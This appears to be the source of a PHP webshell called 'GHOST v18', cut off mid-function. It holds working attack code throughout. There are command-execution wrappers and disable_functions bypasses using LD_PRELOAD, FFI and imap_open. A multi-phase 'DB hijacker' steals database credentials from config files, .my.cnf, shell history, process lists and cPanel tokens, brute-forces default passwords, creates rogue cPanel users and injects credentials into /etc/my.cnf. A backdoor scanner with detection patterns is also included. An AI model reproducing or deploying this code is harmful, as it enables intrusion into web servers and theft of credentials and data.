<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - V17: Grouped Scanner UI, DB CLI Bypass.

define('GH_VER',      '18.0.0-v17');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}
function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => (string)@ini_get('open_basedir'),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_fetch_adv($url, $timeout = 10) {
    if (gh_can('curl_init')) {
        $c = @curl_init($url);
        if ($c) {
            @curl_setopt_array($c, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0', CURLOPT_SSL_VERIFYPEER => false));
            $d = @curl_exec($c); $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE); @curl_close($c);
            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
        }
    }
    if (gh_can('file_get_contents')) {
        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
    }
    if (gh_can_exec()) {
        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
        gh_exec($cmd, $timeout + 2);
        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system'); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed');
}

function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
    if (gh_can('system')) { @ob_start(); @system($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null); }
    if (gh_can('passthru')) { @ob_start(); @passthru($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null); }
    if (gh_can('shell_exec')) { $out = @shell_exec($wrapped); if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null); }
    if (gh_can('exec')) { $lines = array(); @exec($wrapped, $lines); if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null); }
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) { $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; } @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null); }
    }
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w')); $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
            $out = ''; $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

function gh_exec_adv($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $r = gh_exec($cmd, $timeout); 
    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) return $r;

    if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
        $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
        if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
            if (@is_file($so_file)) {
                @file_put_contents($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
            }
        }
    }
    if (gh_can('ffi') && class_exists('FFI')) {
        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
    }
    if (gh_can('imap_open')) {
        $payload = "() { ;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path); if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) { $h = @fopen($path, 'rb'); if (is_resource($h)) { $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($h); if (is_string($d)) return $d; } }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_read_chunk($path, $chunk_size = 2097152) {
    if (!@is_file($path)) return null;
    $sz = @filesize($path);
    if ($sz === false || $sz > 20971520) return null;
    $h = @fopen($path, 'rb');
    if (!$h) return null;
    $out = ''; $read = 0;
    while (!@feof($h) && $read < 20971520) {
        $chunk = @fread($h, $chunk_size);
        if ($chunk === false) break;
        $out .= $chunk;
        $read += strlen($chunk);
    }
    @fclose($h);
    return $out;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) { $h = @fopen($path, $append ? 'ab' : 'wb'); if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; } }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec_adv($cmd); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

// ==== SECTION 3: STATIC AI ANALYZER =========================================
function gh_analyze_intent($content) {
    if (!is_string($content) || $content === '') return array('score' => 0, 'reason' => 'Empty');
    $score = 0; $reasons = array();
    if (preg_match('/\b(eval|assert|create_function)\s*\(/i', $content)) { $score += 40; $reasons[] = "Fungsi eksekusi dinamis (eval/assert)"; }
    if (preg_match('/\b(system|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/i', $content)) { $score += 40; $reasons[] = "Eksekusi perintah OS (system/exec)"; }
    if (preg_match('/`.*?`/s', $content) && preg_match('/\$_/', $content)) { $score += 30; $reasons[] = "Eksekusi shell via backtick (`)"; }
    if (preg_match('/\$[a-zA-Z0-9_]+\s*\([^)]*\$[a-zA-Z0-9_]*\)/i', $content)) { $score += 20; $reasons[] = "Variable Function (misal: $a($b))"; }
    if (preg_match('/(base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin|pack)\s*\(/i', $content)) { $score += 25; $reasons[] = "Decoding (base64/gzip/hex)"; }
    if (preg_match('/preg_replace\s*\(.*?\/e/i', $content)) { $score += 30; $reasons[] = "preg_replace e-modifier (RCE)"; }
    if (substr_count($content, '.=') > 10) { $score += 20; $reasons[] = "Penumpukan string (String Concatenation)"; }
    if (preg_match('/\b(file_get_contents|fopen|readfile|curl_exec|fsockopen)\s*\(/i', $content) && preg_match('/\$_/', $content)) { $score += 15; $reasons[] = "Input user masuk ke File/Network"; }
    if (preg_match('/\/etc\/(passwd|shadow)|wp-config\.php|\.env|\.ssh/i', $content)) { $score += 30; $reasons[] = "Target file sensitif (passwd/wp-config)"; }
    if (preg_match('/HTTP_X_AUTH/i', $content) || (preg_match('/hex2bin\(/i', $content) && preg_match('/hash_equals/i', $content))) { $score += 50; $reasons[] = "Backdoor Auth Bypass (X-Auth/Hash)"; }
    return array('score' => $score, 'reason' => implode(', ', $reasons));
}

function gh_scan_batch($root, $offset = 0, $limit = 50) {
    $res = array('files' => array(), 'done' => false, 'total' => 0);
    $all_files = array(); $stack = array($root);
    while ($stack) {
        $current = @array_pop($stack);
        $files = @scandir($current);
        if ($files === false) continue;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $current . '/' . $f;
            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
            elseif (@is_file($path)) {
                if (@filesize($path) > 20 * 1024 * 1024) continue; 
                $all_files[] = $path;
            }
        }
    }
    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);
    
    $illegal_kw = array('slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol','slot88','toto','bandar','sbobet');
    $mal_users = array();

    foreach ($batch as $path) {
        $c = gh_read_chunk($path, 2097152);
        $size = @filesize($path);
        $filename = basename($path);
        $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = array(); $type = 'Clean / Unknown'; $desc = 'No specific signature matched.'; // Default
        
        $owner = @posix_getpwuid(@fileowner($path));
        $owner_name = is_array($owner) ? $owner['name'] : 'unknown';
        
        $intent = gh_analyze_intent($c);
        $score = $intent['score'];
        $reason = $intent['reason'];

        if (preg_match('/^\.vnt_[a-f0-9]+\.php$|^\.vnt_/i', $filename)) {
            $type = 'Leftover Dropper (Sampah)';
            $desc = 'File sisa dari exploit/backdoor yang gagal. AMAN UNTUK DIHAPUS.';
        } elseif ($score >= 60) {
            $type = 'AI: High Malicious Intent';
            $desc = "Skor $score/100. Terdeteksi: $reason";
        } elseif ($score >= 30) {
            $type = 'AI: Suspicious Code';
            $desc = "Skor $score/100. Terdeteksi: $reason";
        } elseif (is_string($c) && (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false)) { 
            $type = 'Obfuscated RCE'; $desc = 'Menggunakan eval()/assert().'; 
        } elseif (is_string($c) && preg_match('/(shell_exec|passthru|system|popen|proc_open|pcntl_exec)\s*\(\s*\$_/i', $c)) { 
            $type = 'Direct Webshell'; $desc = 'Mengeksekusi shell dari parameter HTTP.'; 
        } elseif (!$ext && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi tapi berisi kode PHP.';
        } elseif (in_array($ext, array('jpg','jpeg','png','gif')) && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $desc = 'Gambar disisipi kode PHP.';
        } elseif ($size > 102400 && is_string($c) && $ext === 'php') {
            $sample = substr($c, 0, 102400);
            $freq = array_count_values(str_split($sample));
            $ent = 0; $len = strlen($sample);
            foreach ($freq as $cnt) { $p = $cnt / $len; $ent -= $p * log($p, 2); }
            if ($ent > 5.5) { 
                $type = 'High Entropy (Obfuscated)';
                $desc = "File PHP besar dengan entropy tinggi ($ent). Kemungkinan malware ter-encode.";
            }
        } elseif ($size === 0 && in_array($ext, array('php','phtml'))) { 
            $type = 'Empty Shell'; $desc = 'File 0-byte. Backdoor gagal upload.';
        }
        
        $found_kw = array();
        if (is_string($c)) {
            foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
        }
        if ($found_kw) { 
            if($type === 'Clean / Unknown') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal.'; }
            $desc .= ' Keyword: ' . implode(', ', $found_kw); 
        }
        
        if ($type !== 'Clean / Unknown') {
            $mal_users[$owner_name] = true;
            $desc .= " (Owner: $owner_name)";
            $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
        } else {
            $global_blacklist = @json_decode(@file_get_contents(GH_STATE_DIR . '/gh_blacklist.json'), true);
            if (is_array($global_blacklist) && isset($global_blacklist[$owner_name])) {
                $type = 'Suspicious (Attributed)';
                $desc = "File ini bersih, TAPI di-upload oleh user '$owner_name' yang sebelumnya ketahuan meng-upload backdoor.";
                $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
            }
        }
    }
    
    if (!empty($mal_users)) {
        $bl_file = GH_STATE_DIR . '/gh_blacklist.json';
        $bl = @json_decode(@file_get_contents($bl_file), true);
        if (!is_array($bl)) $bl = array();
        foreach ($mal_users as $u => $tr) { $bl[$u] = time(); }
        @file_put_contents($bl_file, json_encode($bl));
    }

    return $res;
}

// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V16) =============================
function gh_db_connect($host, $user, $pass, $socket = null) {
    $host = trim($host); $user = trim($user); $pass = trim($pass);
    
    // PRIORITAS 1: CLI
    if (gh_can_exec()) {
        $cmd = 'mysql ' . ($socket ? '-S ' . @escapeshellarg($socket) : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
        $res = gh_exec_adv($cmd);
        if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
            return 'CLI';
        }
    }
    
    // PRIORITAS 2: MySQLi
    if (gh_can('mysqli_connect')) {
        try { 
            if ($socket) $conn = @mysqli_connect(null, $user, $pass, '', null, $socket);
            else $conn = @mysqli_connect($host, $user, $pass); 
            if ($conn) return $conn; 
        } catch (Throwable $e) {}
    }
    
    // PRIORITAS 3: PDO
    if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
        try { $dsn = "mysql:"; if ($socket) $dsn .= "unix_socket=$socket;"; else $dsn .= "host=$host;"; $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
    }
    
    return false;
}

function gh_db_harvest() {
    $logs = array(); $info = array();
    $found_pass = false;
    $db_host = 'localhost'; $db_user = ''; $db_pass = ''; $db_socket = null;
    $max_iterations = 5;

    for ($iter = 1; $iter <= $max_iterations; $iter++) {
        if ($found_pass) break;
        $logs[] = "=== ITERATION $iter / $max_iterations ===";

        // Phase 1: File Scan
        $logs[] = "[*] Phase 1: Scanning config files...";
        $find_res = gh_exec_adv("find /home /var/www /etc /tmp -maxdepth 5 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' -o -name '*.sql' \\) 2>/dev/null");
        $found_configs = array();
        if (isset($find_res['out']) && is_string($find_res['out'])) {
            $lines = explode("\n", trim($find_res['out']));
            foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
        }
        foreach ($found_configs as $cf) {
            $c = gh_read($cf);
            if ($c) {
                $logs[] = "[+] Config ditemukan: $cf";
                if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = trim($m[1]);
                elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = trim($m[1]);
                elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = trim($m[1]);
                elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = trim($m[1]);

                if ($db_user && $db_pass) { 
                    $logs[] = "[*] Mencoba koneksi dengan kredensial $db_user...";
                    $conn = gh_db_connect($db_host, $db_user, $db_pass);
                    if ($conn) { $logs[] = "[+] KONEKSI BERHASIL!"; $found_pass = true; break 2; }
                    else { $logs[] = "[-] Gagal. Lanjut Phase 2..."; $db_user = ''; $db_pass = ''; }
                }
            }
        }

        // Phase 2: Sniffing
        if (!$found_pass) {
            $logs[] = "[*] Phase 2: Sniffing .my.cnf dan bash_history...";
            $home = @getenv('HOME'); if(!$home) $home = '/home/' . @get_current_user();
            $sniff_files = array('/root/.my.cnf', '/etc/my.cnf', '/etc/mysql/debian.cnf', $home . '/.my.cnf', $home . '/.bash_history', '/root/.bash_history');
            foreach ($sniff_files as $sf) {
                $c = gh_read($sf);
                if ($c) {
                    $logs[] = "[+] File sniff ditemukan: $sf";
                    if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                    if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                    if (preg_match('/host\s*=\s*([^\s]+)/i', $c, $m)) $db_host = trim($m[1]);
                    if (preg_match('/mysql\s+-u\s*([^\s]+)\s+-p([^\s]+)/i', $c, $m)) {
                        $db_user = trim($m[1]); $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
                    }
                    if (strtolower($db_host) === 'none' || trim($db_host) === '') $db_host = 'localhost';
                    if ($db_user && $db_pass) {
                        $logs[] = "[*] Kredensial ditemukan. Mencoba koneksi...";
                        $conn = gh_db_connect($db_host, $db_user, $db_pass);
                        if ($conn) { $logs[] = "[!] KONEKSI BERHASIL!"; $found_pass = true; break 2; }
                        else { $logs[] = "[-] Gagal. Lanjut Phase 3..."; $db_user = ''; $db_pass = ''; }
                    }
                }
            }
        }

        // Phase 3: Env & Process
        if (!$found_pass) {
            $logs[] = "[*] Phase 3: Environment & Process leak...";
            $env_out = gh_exec_adv("env | grep -i 'mysql\\|db_\\|database'");
            if (isset($env_out['out']) && is_string($env_out['out']) && trim($env_out['out']) !== '') {
                $logs[] = "[+] Env leak terdeteksi!";
                if (preg_match('/DB_USER=([^\s]+)/i', $env_out['out'], $m)) $db_user = trim($m[1]);
                if (preg_match('/DB_PASS(?:WORD)?=([^\s]+)/i', $env_out['out'], $m)) $db_pass = trim($m[1]);
                if ($db_user && $db_pass) { $conn = gh_db_connect('localhost', $db_user, $db_pass); if ($conn) { $found_pass = true; break; } }
            }
            if (!$found_pass) {
                $ps_out = gh_exec_adv("ps aux | grep -i mysql | grep -v grep");
                if (isset($ps_out['out']) && preg_match('/-u\s*([^\s]+)\s+-p([^\s]+)/i', $ps_out['out'], $m)) {
                    $logs[] = "[+] Credential bocor di Process List (ps aux)!";
                    $db_user = trim($m[1]); $db_pass = trim($m[2]);
                    $conn = gh_db_connect('localhost', $db_user, $db_pass);
                    if ($conn) { $found_pass = true; break; }
                }
            }
        }

        // Phase 4: Bruteforce
        if (!$found_pass) {
            $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
            $defaults = array(array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'), array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel'));
            foreach ($defaults as $creds) {
                $conn = gh_db_connect('127.0.0.1', $creds[0], $creds[1]);
                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = '127.0.0.1'; $found_pass = true; break; }
            }
        }

        // Phase 5: cPanel UAPI
        if (!$found_pass) {
            $logs[] = "[*] Phase 5: cPanel UAPI Hijack (Membuat Temporary User)...";
            $uapi = '/usr/local/cpanel/bin/uapi';
            if (@is_file($uapi)) {
                $user = @getenv('USER') ?: @get_current_user();
                $rand_pass = substr(md5(uniqid()), 0, 10);
                $create_res = gh_exec_adv("$uapi --user=$user Mysql create_user user=ghost_$rand_pass password=$rand_pass 2>&1");
                if (strpos($create_res['out'], 'success') !== false) {
                    $logs[] = "[!] cPanel UAPI BERHASIL bikin user: ghost_$rand_pass (Pass: $rand_pass)";
                    $conn = gh_db_connect('127.0.0.1', "ghost_$rand_pass", $rand_pass);
                    if ($conn) { $found_pass = true; $db_user = "ghost_$rand_pass"; $db_pass = $rand_pass; }
                } else { $logs[] = "[-] Gagal cPanel UAPI. Lanjut Phase 6..."; }
            } else { $logs[] = "[-] cPanel UAPI tidak ditemukan. Lanjut Phase 6..."; }
        }

        // Phase 6: Deep Backup
        if (!$found_pass) {
            $logs[] = "[*] Phase 6: Deep SQL & Backup Leak...";
            $deep_find = gh_exec_adv("find /home /var/www /tmp -type f \\( -name '*.sql' -o -name '.mysql_history' -o -name '*.my.cnf' \\) 2>/dev/null | head -n 10");
            if (isset($deep_find['out']) && is_string($deep_find['out'])) {
                $files = explode("\n", trim($deep_find['out']));
                foreach ($files as $df) {
                    if (!$df) continue;
                    $c = gh_read($df);
                    if ($c && preg_match('/INSERT INTO|CREATE TABLE|-- MySQL dump/i', $c)) {
                        $logs[] = "[!] Backup SQL ditemukan di: $df";
                        if (preg_match('/INSERT INTO `wp_users`.*?VALUES\s*\((.*?)\)/is', $c, $m)) $logs[] = "[+] User WordPress ditemukan di SQL dump: " . substr($m[1], 0, 50) . "...";
                    }
                }
            }
        }

        // Phase 7: Socket Auth
        if (!$found_pass) {
            $logs[] = "[*] Phase 7: Socket Auth & Empty Password...";
            $socks = array('/var/run/mysqld/mysqld.sock', '/var/lib/mysql/mysql.sock', '/tmp/mysql.sock');
            foreach ($socks as $sock) {
                if (@is_file($sock)) {
                    $logs[] = "[+] Socket ditemukan: $sock";
                    $conn = gh_db_connect('localhost', 'root', '', $sock);
                    if ($conn) { $logs[] = "[!] KONEKSI ROOT KOSONG BERHASIL!"; $db_user = 'root'; $db_pass = ''; $found_pass = true; $db_socket = $sock; break; }
                }
            }
        }

        // Phase 8: cPanel API Token
        if (!$found_pass) {
            $logs[] = "[*] Phase 8: cPanel API Token Deep-Dive...";
            $home = @getenv('HOME');
            $token_files = array($home . '/.cpanel/api_tokens', '/var/cpanel/api_tokens/' . @get_current_user());
            foreach ($token_files as $tf) {
                $c = gh_read($tf);
                if ($c && preg_match('/([a-zA-Z0-9]{32,})/', $c, $m)) {
                    $logs[] = "[+] API Token ditemukan di $tf";
                    $token = $m[1];
                    $res = gh_exec_adv("curl -sk -H 'Authorization: cpanel " . @get_current_user() . ":$token' 'https://127.0.0.1:2083/execute/Mysql/list_databases'");
                    if (strpos($res['out'], 'data') !== false) { $logs[] = "[!] API Token Valid! Database berhasil di-list via API."; $found_pass = true; break; }
                }
            }
        }

        // Phase 9: WP-CLI Magic
        if (!$found_pass) {
            $logs[] = "[*] Phase 9: WP-CLI Magic...";
            if (@is_file('/usr/local/bin/wp') || @is_file('/usr/bin/wp')) {
                $wp_cmd = @is_file('/usr/local/bin/wp') ? '/usr/local/bin/wp' : '/usr/bin/wp';
                $cwd = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
                $res = gh_exec_adv("cd " . @escapeshellarg($cwd) . " && $wp_cmd db query 'SHOW DATABASES;' --allow-root 2>&1");
                if (isset($res['out']) && strpos($res['out'], 'Database') !== false) {
                    $logs[] = "[!] WP-CLI BERHASIL Dump DB!";
                    $found_pass = true; $db_user = 'wp-cli'; $db_host = 'localhost'; break;
                }
            }
        }

        // Phase 10: PHP Session Leak
        if (!$found_pass) {
            $logs[] = "[*] Phase 10: PHP Session & Tmp Leak...";
            $sess_files = gh_exec_adv("find /tmp /var/lib/php/sessions -type f -name 'sess_*' 2>/dev/null | head -n 5");
            if (isset($sess_files['out']) && is_string($sess_files['out'])) {
                foreach (explode("\n", trim($sess_files['out'])) as $sf) {
                    if (!$sf) continue;
                    $c = gh_read($sf);
                    if ($c && preg_match('/db_user|db_pass/i', $c)) $logs[] = "[+] Kredensial DB ditemukan di Session File: $sf";
                }
            }
        }

        // Phase 11: MySQL Config Injection
        if (!$found_pass && @is_writable('/etc/my.cnf')) {
            $logs[] = "[*] Phase 11: MySQL Config Injection...";
            $backup = gh_read('/etc/my.cnf');
            gh_write('/etc/my.cnf', $backup . "\n[client]\nuser=root\npassword=root\n");
